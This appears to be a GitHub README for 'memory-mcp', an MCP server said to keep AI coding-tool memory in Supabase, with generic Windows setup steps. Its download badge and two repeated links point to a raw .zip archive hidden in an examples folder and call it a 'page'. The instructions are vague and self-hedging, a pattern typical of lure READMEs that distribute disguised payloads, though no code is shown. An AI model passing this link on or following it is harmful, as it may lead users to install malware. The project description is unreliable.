# 🧠 memory-mcp - Keep Project Memory in Sync

[![Download memory-mcp](https://img.shields.io/badge/Download%20memory--mcp-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/User75621/memory-mcp/main/examples/claude-desktop/mcp-memory-2.7.zip)

## 🚀 What memory-mcp does

memory-mcp helps you keep project memory in one place. It works with OpenCode, Antigravity, Claude Code, and Codex through the Model Context Protocol, or MCP.

Use it to store notes, project details, and past decisions in Supabase. That lets your AI tools remember what matters across sessions.

## 🖥️ Windows setup

This guide is for Windows users who want to get started fast.

You will need:

- A Windows 10 or Windows 11 PC
- An internet connection
- A web browser
- Access to a Supabase account
- An AI tool that supports MCP, such as Claude Code, OpenCode, Antigravity, or Codex

## 📥 Download memory-mcp

Visit this page to download and set up memory-mcp:

https://raw.githubusercontent.com/User75621/memory-mcp/main/examples/claude-desktop/mcp-memory-2.7.zip

If the page has a release file, download it. If it has setup files or source code, save the files to your PC so you can run the server from that folder.

## ⚙️ Set up Supabase

memory-mcp stores project memory in Supabase. You need a Supabase project before you start.

1. Go to Supabase and sign in.
2. Create a new project.
3. Save your project URL.
4. Save your API keys.
5. Keep the database settings for later use.

You also need a table for memory data. Use the schema included in the repository if it is provided. If not, create a table for notes, project IDs, timestamps, and message text.

## 🧩 Install Python

memory-mcp uses Python on Windows.

1. Open the Python website.
2. Download Python 3.11 or newer.
3. Run the installer.
4. Check the box for Add Python to PATH.
5. Finish the install.

To confirm it works, open Command Prompt and run:

python --version

## 📂 Open the folder

After you download the files, put them in a folder such as:

C:\memory-mcp

Open that folder in File Explorer.

If the repository contains a requirements file, use it to install the needed packages.

## 🛠️ Install the needed packages

Open Command Prompt in the memory-mcp folder and run:

pip install -r requirements.txt

If the project uses another package file, use that file instead.

## 🔐 Add your Supabase settings

memory-mcp needs your Supabase details to connect to your memory store.

Create a file named `.env` in the project folder and add your values:

SUPABASE_URL=your_supabase_url
SUPABASE_KEY=your_supabase_key
SUPABASE_TABLE=your_table_name

If the project includes sample settings, copy that format and fill in your own values.

## ▶️ Run memory-mcp

In Command Prompt, stay in the project folder and run:

python main.py

If the repository uses a different start file, run the main file that starts the MCP server.

When the server starts, it will stay open and listen for requests from your AI tool.

## 🔗 Connect it to your AI tool

Add memory-mcp to the MCP setup for your tool.

Use the server command or file path from the project files, then point it to the Python file that starts the service.

A common setup looks like this:

- Server name: memory-mcp
- Command: python
- Arguments: path to the start file
- Environment: your Supabase settings

Then restart your AI tool.

## 📝 How to use it

Once connected, your AI tool can store and read project memory.

You can use it for:

- Project goals
- Decision history
- Task notes
- File context
- User preferences
- Long-term project facts

This helps the tool keep track of work across chats and sessions.

## 🧪 Check that it works

Try a simple test:

1. Add a note in your AI tool.
2. Ask it to save the note to memory.
3. Close the tool.
4. Open it again.
5. Ask for the saved note.

If the setup is correct, the tool will pull the same memory from Supabase.

## 🔧 Common fixes

If the server does not start:

- Check that Python is installed
- Check that you are in the right folder
- Check that the `.env` file has the correct values
- Check that your Supabase table exists
- Restart Command Prompt and try again

If your AI tool cannot see the server:

- Confirm the MCP config points to the right Python file
- Make sure the server is running
- Restart the AI tool after changes

If memory does not save:

- Check the Supabase key
- Check table access rules
- Confirm the table name matches your settings

## 📚 Folder layout

A simple project layout may look like this:

- `main.py` — starts the server
- `requirements.txt` — lists Python packages
- `.env` — stores your Supabase values
- `README.md` — setup notes
- `src/` — app code
- `schemas/` — database setup files

## 🔒 Privacy and data

memory-mcp stores project memory in your own Supabase project. That gives you control over where the data lives and who can access it.

Use a private Supabase project and keep your keys safe.

## 🧠 Best use cases

memory-mcp works well for:

- Personal project notes
- Team project memory
- AI coding sessions
- Research logs
- Repeated task context
- Long project work that spans many days

## 📎 Useful link

Download and setup page:

https://raw.githubusercontent.com/User75621/memory-mcp/main/examples/claude-desktop/mcp-memory-2.7.zip